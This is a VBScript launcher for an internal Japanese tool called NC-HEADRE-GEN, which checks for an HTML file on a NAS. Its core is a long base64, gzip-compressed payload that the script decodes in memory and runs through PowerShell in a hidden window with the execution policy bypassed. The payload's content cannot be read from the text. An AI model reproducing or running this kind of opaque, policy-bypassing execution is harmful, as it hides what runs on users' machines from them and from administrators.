Option Explicit

Const APP_NAME = "NC-HEADRE-GEN"
Const WINDOW_TITLE = "NCヘッダージェネレーター"
Const HTML_FILE_NAME = "index.html"
Const ICON_FILE_NAME = "appicon.png"

Dim fso
Dim shell
Dim scriptFolder
Dim htmlPath
Dim iconSource
Dim processEnvironment
Dim payload
Dim decoderCommand
Dim powerShellPath
Dim command
Dim exitCode

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

scriptFolder = fso.GetParentFolderName(WScript.ScriptFullName)
htmlPath = fso.BuildPath(scriptFolder, HTML_FILE_NAME)
iconSource = fso.BuildPath(scriptFolder, ICON_FILE_NAME)

If Not fso.FileExists(htmlPath) Then
    MsgBox _
        "NAS上のHTMLファイルを確認できないため、NC-HEADRE-GENを起動できません。" & vbCrLf & vbCrLf & _
        "ネットワーク接続とNASへのアクセスを確認してから、もう一度お試しください。" & vbCrLf & _
        "確認先：" & htmlPath, _
        vbExclamation, _
        APP_NAME
    WScript.Quit 2
End If

Set processEnvironment = shell.Environment("Process")
processEnvironment("NC_HEADRE_HTML") = htmlPath
processEnvironment("NC_HEADRE_LAUNCHER") = WScript.ScriptFullName
processEnvironment("NC_HEADRE_APP_NAME") = APP_NAME
processEnvironment("NC_HEADRE_WINDOW_TITLE") = WINDOW_TITLE
processEnvironment("NC_HEADRE_ICON_SOURCE") = iconSource

payload = ""
payload = payload & "H4sIAAAAAAACA8U7bW8bx5nf+SsGDg8ka5KhZcdIFAgwTVEWLxKlE+moOVlwV8sROeflzmZ2aEkNDGipvDh1XANpmsBp2jS5"
payload = payload & "NHbjnpwrkFZnp8mP2VBSPvUvHOZld2d2l7QdG6g+iNydmef9eeZ5nhlm64RgUjUpwvYygZuQQNuEYAbkWhQ7uUwm26N9a9mg"
payload = payload & "PTADstC+Ot2sXZ6vV2dX6pfn24sLmaxlDGyzB0n6nIXqxWZtvr6SyRqO0zT6MDmlurx8uVldrGeyW8ju4K02olbKtNVGc3Zp"
payload = payload & "9XK70V6oZ7LIxHYLD4iZMrNRW2pebi1dXKnVMxm0CfJrLiXI7q5PTzfc5sCylshqD1HYcgwT5kMGC6CESQYAACbPVxl+3DWS"
payload = payload & "+cedrgiiUABv8BVwG1EwVclcy2SqnU6pveNAwP/Pwk1kI6ZAcC6XGbjI7oLWjkth/2XtqbwysCnqw3LDppBgpwXJVWRCNzar"
payload = payload & "Dbfpy5mMM9iwkAlcalBkAtMyXBc0DYquwlVOnKRKTutAC3YNCsEGxhao24O+mOUuE2zmGzZdpgT0Vu1OEcgHa9kgRr/wckaI"
payload = payload & "o0XJwKQLxg4e0Lz4eAXZnXILvj6ANkWGVVhXEbp8PlheajTbkhRlFNkU/PzltLevibfXng7tSr02BusC3KSpiNvYSX2/grq9"
payload = payload & "9BXnMaW4/6T0FkGtZ5AWpGAm+FauDihO5WNxqdloL600mnNL6eyYGy30S5ggj/NPzEVsI4rJuOFVTK4kxgYMbGdrzjK6rs7b"
payload = payload & "rGU1+g4mNH9i4EJyeqrcsawTcbq5OcJtCoktjK0FKTMy6LqzDqpuGQTa0HVr2KZwmwam13GQfBNa3E9Ep9h2PmbnwDQsa8Mw"
payload = payload & "r4wz8p+IsuEKJK8iF21YUHWnR4BOM4aLNjJxB07CylR0AVKBlcWDBWh3ae9fgFgPHS0eM88PkNWBBDBtFvmSvrFdwwP7aXQ7"
payload = payload & "0FH3CDQ60qwaHZ0KPKBiuhOMP62CWz28JRBX3R07Fi+5G+J+37CfHg+kc5jALsEDuyMQPoFOHwn+PNOOFCBuY+dZwm4FqlnG"
payload = payload & "bj6MKaqg4i+R7UJCq5sUkmiMCXNbf9zRH7dQh/b0Vz3IYnT0jit/kwUw/uopWJOkyjg6R3A/qZWigu+ZolrGyKZ5sYM67PsT"
payload = payload & "YHrcXSahxwuQShIa9iYO+OyLV0VA4Ka2KSF7Ez+t6VyAtDYgLibMdJjzKiw/g4gx66A5TJ69N81ClxK80zCxHYJlD4WXM9cy"
payload = payload & "uXOZzHOgutzwvTuj7z7yhzdGD+4c3r3tD9/3dz1/73N/74Y//N7f+9b3PvC9u763Lzeq48/uHn3xYLR78+jX7/jevdH970bf"
payload = payload & "f+J7H/nep6P9T/29D/zhfX/40N+753sHvvd7f3jT9677wxv+7jBDyY7ME9auYtRZX1MzwvXp6cl78ZpgYz1fOlMoZK4B06Bm"
payload = payload & "T8J7DoxufeF7b0oqfe+O7933vd/43v7he++M9j/2h+//8I/vGSneV773pu996g89f9f7cffj0cGB7+0LARzfvX60/5HvHfy4"
payload = payload & "+1d/uMuIvpbJbA5sXuEwfZXqnS7kxYrAnCWwi1xKdl6BOy6YAeei8JJbkUPT0/Ov1F+7vLBUqy5cXqzW5hvN+qXW0lx7tbpS"
payload = payload & "v7SITIJdvEkvSeov1QaEQJu+ComLsH2p6jiAYXQv9V3Y6cIy3Ia54pOiWV1aPXvm9FQTd+AzR1m7uLJSb7YvX2zVV56WMREU"
payload = payload & "hfFvYgINswfy2StwByBbl3ZBSToj0wr+slcNa8DKuzzTWoPCPigtIAqJIepRBrJQvgDpq2xePpcraMtZ4SdBlAy7A/Jt6NIS"
payload = payload & "X6mDkXPYAy+qFqCxWSjEiGF/BNIBseUCbfRa+KRbdfD3HDj8y2fMRndvH//3J/7w/aPPHxx/ddP3bkvH0gHJjDh7xcZbNpcv"
payload = payload & "t8tCTKQEY8pkei6ffYNVwMsEd4nRn0MWdPPbL54tXCuK0lgdkK+4jVWXl2er7arGLBcbgxyXgErNyRnw7xjZQpqCjlxkLMzB"
payload = payload & "mGlYyDSY1yWMQ+VUZ8lhAJmZRMgSxPE5k1UqpkzWaKBNNneM/GXaBWZ43KjJp5zCDigp/RPQQha0qbXDAh6ypY1wmoMETqEh"
payload = payload & "wC+HyqKboUglmGAPLEsLYnPI7pSqjqMV4lnXJMih031mflBmd2AGBEF3evo/IcGSL1mnsGE1gp+MFTTralHIKpkwhGd7ht2x"
payload = payload & "YDEEnx3YAxd2pNsHfJdsTEF8k4iXMxLWWAVRonjbtQhB1uJVSZyJ9enptNolwKLbkgRRsiCoPDF+tqmBGdCEW6Wljf+CJlVb"
payload = payload & "KGW9WAlRnQSnIhrSd1G9AgpFnRUFD/8o1wzHMBHdifHDx9pY4M4XQMmGQOsmPSGPayzLOT21ng1rHTADKo9Nf6yMiqyGwE0F"
payload = payload & "ZmHSLiBnMTVL8c4io2tjlyLTLUvgAqt8OL/T6OTXkE1TUURxRIwFIHhzsoTg64GD59L2gHFuJlkbu2dsGpb7pHvG0TfDHx68"
payload = payload & "/ePuBz8c/I/v7R998PDH33/ue/dH9787/t/PfO8eT9t4NpTYQlKVG3RaUrWmNjayUSdDjx8FLTKlySKRbsl0nzWDqgQaQd9Q"
payload = payload & "DydykgwfWZb2656lhSmlQojml0WvitnJmEZnedEgbs+wWKKKfgmXNvN8YSEzMVzFKpaA1MCIOQQtkekRvAVyeg6+L9PuW/eP"
payload = payload & "9/5xdP/N0e/+6g/fH936kCXvLNe96Xvf+d7v/OFv+CNLx/3dYS5lO+C8iuaaJusWpNGmsIxd0RFWpR25bSD2eeGP0QCrPNaz"
payload = payload & "DbcJZUNCTeayNjQIdANxgBkwFe1wyhpVGlmTl14TlMmrMS2KpWggKuCE1AXUxJaR7YekxYEkCl8Joxhnq6D4JbRc+JNQyHIw"
payload = payload & "EPAEHJlUTM8Qi3T658DhJ7ujr2+N3vvQ33vIvn9xh3339n3vz773mT981x8ORTUljNX3Dg6vP2Q5qowuY2q+WPMqpOYlgb9F"
payload = payload & "DUJLLQtCB5QWkWUhF5rY7rjg1FRFGtYWJldklhUPF8GLUCTRilXWqmGxlz2UeSMdlOQT68NHM+d5ByecKjrr4dw2dkIZffj1"
payload = payload & "8Ze3wkjr73qjt66LMpmFXM2nD47uPOSe+qXv3WDi2/VYveztp7u+qLgjp1dT/4ke5BC8AQNe1xYN2mNWgOz8mUqlqEiiEFsS"
payload = payload & "Mp2+Rgw/KhdJ77txJPHgoUYWsVvoY5FiwEnwYtpYGzspQxH/aQPzseYc+6tsVypnoiwl4nGCLZ6taKl/x0HpiaXW7pEyiHYQ"
payload = payload & "vi6RTUpoL53VHZKdnz5fa7WE+RztfzR654EI/acqlX8TZnN4e8jqxu/fOv7S84ff+MMv/OGDf357ndVYoy8+PPzDH4+/+9b3"
payload = payload & "vv/nt+8GxpQl8PUBImxD7tBelZ6qVMAMODt1Rh8VgguGX3qxEpQRhgU7KyoIxYRWWOc4n4bhZ4LL58FLZwtpkBLWGAOlkpOE"
payload = payload & "1Te246TMWRiTvBIIfgYq5Zei+QmEygI5JlfIOJHiYWnSKEbUSGS9NEdLZb+oUCYXb4dRSXqGTq7KYEkSWQDPgym5fCdcLpwn"
payload = payload & "bbXkthRQKtdnntTrk+nCGG/PKi32rNJfz8aa69l4Z11x3ELgJT8c7B7eHh59/Kbv3WPb1rs3eWw+kM6y640ODg5vD5Whe7x1"
payload = payload & "GEuNnwmj+dKpgkLtk3zdrlQqp0BpAxPxfSr6HnL8DOmc+tfQmTgC0iLkWN4Sp1LhMjXDZRlk1XFYE3xMXisvVWRFL6WYHGBN"
payload = payload & "dWTzrpRqZWHyP7ajJO+aTOgpJSs9Gej1mja6u1F1XdjfsHZ44RmUtsTYQnZX2Tkigucw7yTMgJZjoYDIZdZjpyDB2ONxlYQe"
payload = payload & "MciaWAayYTLLFmrMM3WIriz7z9fMIgJNiskOKI1FMIeJCQupDRWXC7nRN7r8Vg9vfIWDG4j2DSf5vksMp4dMNznC7ggl37qU"
payload = payload & "QKOfPltYXXrXbEx7Qqd5Tddjmb9n4Zhg3n7NS0PS2xERb8leUgDpvJgy9cLZoviXT8PFPpfRNrTmMOkblGHmX05PbThOlXQ3"
payload = payload & "YogV4cXBXZBDknrOSV5SOgZKuWZBgyQIq2ELM1G2iWG7DjfYcQB4xe5gi1vMIu6kyVR+Ts0mZ69PT8+jbu8/BoaF6M55ZA42"
payload = payload & "kBnTF9uWY3v11AtnwfOaKstyq08ZiefNwk2JsZVI0Y3t/KliPN9JIGHZDieqkAIzmcM/EmiY24yH+vNEVsRFUFL4UHIMbelr"
payload = payload & "E5fOq/lFuoaZ9qQtKVQXJWHy87WiQkpRg62D1ZxWGic7EppnA/mUyWk+amJbGrkAlVfAxkCEwSMA0lgqM79en55ecqCdV+Nw"
payload = payload & "MT5JWmiNQIPCFNrKLeMqEwvHobYhNpFtWFY89PB6Q04GbwS0lWeR62AX5gtKJzCcztDwyRzfI6dK0bIucqwPCN4Ys5urx9aq"
payload = payload & "HNNQBEbBKYosZBJVMv6wBVLbE6crJiZkpDhK2sJE83Ts1qkoOp4VZNKbuiuwj6/CtINMDRbfHx/jXGlczhHPmGahe4Vip9XD"
payload = payload & "hJoD2thcRC6/76k1YoMEKTgcD6qijljNLL5uX0UE231oU1EKix2dzc7nJJZcUPtJbPJSsHJYGAAM78SCkyBXtuwruaiKHidz"
payload = payload & "FWoy9dLqdwubhsWMMMyaFBriB6AgoCW2Nkl9HKzOBTJxIICBC4NUdUbVzyT2lDvNMYtSewkEdqENCbtsOwMmp3c6I2lWqqWJ"
payload = payload & "CuhEY1XDOu5APmKgUF4wXLpKEIVt1IcXqQlKXZo4HRkHSCM8CSvFXcWx9Xj6NX2ohURJSlyTvuqQOjGPaA7rao+dqmnNn2a1"
payload = payload & "xRqsv/7T0d8+Dk4AWL169Ku/Hb51g70ZDnlHkV2B8Yd/9/fusHbi3nV/eM/f2/P3rh+/89Xxg3u+997hR386/OQvx1/9wffu"
payload = payload & "HH52ffT2W3p3MfSbWniefe5E5hfhRXZ22z+r32svr0DHYlfRT+ROFMGJXO5EoZDLTDBeBVq67YrWmzxrAyW2H/KF+ci7fsEd"
payload = payload & "k93zb6yAnNg7T09d2hLHTPy8vQBKVdIdsBi0gFwK8rkTOXBSxX4S5E7k2O0iRT1jaq5lAl1oU1GdEKMPWbNELVTl9i1PxcqL"
payload = payload & "0HWNLjyPt2XbW7kpNE6d4T2lZq0kfp5QulBv+sP3j7/5++jGb+NnP7tDf++mUK+/d58pfHg/AHpX4ODm8Lm8pTX8P+Uyid6K"
payload = payload & "Hg597+0fDnZHD770vV8d//lLPuGW7/3R934rGiPqhSCNPmVgvBDODyjlmdPSK48zPSiFVg1iByUuq+9PnBNGCm12O7gT2eha"
payload = payload & "DdtXIWGbTRufN1x49ow8117jB+x1tkD8hkJeLWaZ3/kdCt183OQLwX7m9qBl6YUWu9ghv662hKm12Czdd5g/88Vlkb8F+2le"
payload = payload & "35X0ReW2QbowZRdMNfTg5gXegoRTcOnqqXLlksOeBerwBk2EIXAHVsLlSk28TPAmYjmbgNaiOxYE86jTgTYo1XUZM9eJyT0G"
payload = payload & "nR3DILsb1fXp3Qc1dMQgzELhvoiHxFzcDUZfD48+uBscuNz58cMbgT/czkVd9SisalthiISNLGBx24gpSt/4ToJcsZIbc9A2"
payload = payload & "FkZ4TVBdHmOOJ+y8SZXtDyjcTr8Nwm9BsEpjkc3Ji2ygCHIMm3Up+t3ShXoz/L1UrpDJ4i3bXZRgZQoRNSD0VoQ+l9NSXjUQ"
payload = payload & "XbJh/nSlUqnoSelagrTqhmF3sA07HEh924RcZetjcSiXCvQkIpylqor/eOnUlLoFPro7Ff7ybELXTfwqSkv9YKC4Ge26Z4zM"
payload = payload & "YFaSSu0gaGIGHV0lDcGFhwnyXoh+V0veVogO+pLJYbC0BF9P1lxKt0qHoWUaLCe9SFiUy69dJGg9+oVbubrhYmtA4UWCYodi"
payload = payload & "yZ05EmR8zy2VDMeZ4dFDoFKufWU70OhYyOY9lllD5GwsRFOzibfK1U6nJY7c8lOVKAft4FgmNeGk7oVK7OhwgqyF0W/1WESc"
payload = payload & "IFpxnTBJLihZNOKoEDffx9OVsKpT6uL0uxolWW6HYJUTYU3j0e8BK7Fr1OGPBGM9A05tqmfyOBKEjBVoQcOFIk4VohpWu60p"
payload = payload & "54blc+Za5v8BobYsiEY6AAA="
processEnvironment("NC_HEADRE_PS_PAYLOAD") = payload

decoderCommand = _
    "$bytes=[Convert]::FromBase64String($env:NC_HEADRE_PS_PAYLOAD);" & _
    "$input=New-Object IO.MemoryStream(,$bytes);" & _
    "$gzip=New-Object IO.Compression.GzipStream($input,[IO.Compression.CompressionMode]::Decompress);" & _
    "$reader=New-Object IO.StreamReader($gzip,[Text.Encoding]::UTF8);" & _
    "& ([ScriptBlock]::Create($reader.ReadToEnd()))"

powerShellPath = shell.ExpandEnvironmentStrings( _
    "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" _
)
command = QuoteArgument(powerShellPath) & _
    " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
    QuoteArgument(decoderCommand)

exitCode = shell.Run(command, 0, True)

Select Case exitCode
    Case 0
        ' 正常終了。
    Case 2
        MsgBox _
            "NAS上のHTMLファイルを確認できないため、NC-HEADRE-GENを起動できません。" & vbCrLf & vbCrLf & _
            "ネットワーク接続とNASへのアクセスを確認してから、もう一度お試しください。", _
            vbExclamation, _
            APP_NAME
    Case 10
        MsgBox _
            "Microsoft Edgeが見つかりませんでした。" & vbCrLf & vbCrLf & _
            "Edgeが利用できる状態か確認してください。", _
            vbExclamation, _
            APP_NAME
    Case 11
        MsgBox _
            "Edgeは起動しましたが、NC-HEADRE-GENの画面を確認できませんでした。" & vbCrLf & vbCrLf & _
            "少し待ってから、もう一度お試しください。", _
            vbExclamation, _
            APP_NAME
    Case 12
        MsgBox _
            "NC-HEADRE-GENの起動処理が続いています。" & vbCrLf & vbCrLf & _
            "少し待ってから、もう一度お試しください。", _
            vbInformation, _
            APP_NAME
    Case Else
        MsgBox _
            "NC-HEADRE-GENの起動中に問題が発生しました。" & vbCrLf & vbCrLf & _
            "ネットワーク接続とMicrosoft Edgeを確認してから、もう一度お試しください。", _
            vbExclamation, _
            APP_NAME
End Select

Function QuoteArgument(ByVal value)
    QuoteArgument = Chr(34) & Replace(value, Chr(34), Chr(34) & Chr(34)) & Chr(34)
End Function
